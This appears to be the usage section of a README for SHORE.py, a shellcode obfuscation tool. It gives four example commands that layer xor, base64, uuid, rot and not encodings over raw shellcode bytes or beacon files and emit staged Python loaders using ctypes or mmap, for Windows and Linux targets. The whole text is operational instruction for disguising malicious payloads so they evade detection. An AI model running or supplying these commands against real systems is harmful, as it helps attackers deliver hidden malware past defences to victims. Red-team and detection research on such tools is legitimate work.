# Single technique
python3 SHORE.py -s "\xfc\xe8\x82\x00\x00\x00" -t xor

# Multi-layer chaining
python3 SHORE.py -f beacon.bin -t xor,base64,uuid -o payload.py

# All techniques layered
python3 SHORE.py -f shellcode.bin -t all -m ctypes -o staged_payload.py

# Linux target
python3 SHORE.py -s "\x31\xc0\x48\xbb..." -t rot,not -m mmap -o lin_payload.py
